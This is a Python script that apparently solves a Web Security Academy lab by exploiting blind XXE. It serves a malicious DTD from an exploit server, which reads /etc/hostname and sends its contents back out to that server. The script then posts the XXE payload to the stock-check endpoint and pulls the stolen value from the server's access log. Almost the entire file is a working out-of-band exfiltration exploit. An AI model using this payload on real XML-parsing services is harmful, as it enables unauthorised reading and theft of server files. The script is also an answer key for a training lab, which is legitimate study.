from web_security_academy.core.logger import logger
from lxml import etree

import re


def solve_lab(session):
    exploit_server = session.exploit_server()
    head = ["HTTP/1.0 200 OK", "Content-Type: text/xml; charset=utf-8"]
    body = [
        '<!ENTITY % file SYSTEM "file:///etc/hostname">',
        f"<!ENTITY % eval \"<!ENTITY &#x25; exfiltrate SYSTEM '{exploit_server.url}/?x=%file;'>\">",
        "%eval;",
        "%exfiltrate;",
    ]
    exploit_server.craft_response("/malicious.dtd", "\n".join(head), "\n".join(body))

    path = "/product/stock"

    doctype = f'<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "{exploit_server.url}/malicious.dtd"> %xxe;]>'
    stock_check = etree.Element("stockCheck")
    etree.SubElement(stock_check, "productId").text = "1"
    etree.SubElement(stock_check, "storeId").text = "1"

    data = etree.tostring(
        stock_check, encoding="UTF-8", xml_declaration=True, doctype=doctype
    )
    data = data.decode()

    logger.info(
        f'Injecting an XML external entity with the following POST request data to "{path}":'
    )
    print(f"{data}")

    session.post_path(path, data=data)
    logger.success("XXE injection successful.")

    logger.info("Extracting hostname from exploit server log...")
    log = exploit_server.access_log()
    hostnames = re.findall(r"(?<=\/\?x=)[^ ]+", log)

    if len(hostnames) == 0:
        logger.failure("Unable to extract hostname.")
    else:
        hostname = hostnames[-1]
        logger.success(f"Hostname: {hostname}")

    session.submit_solution(hostname)
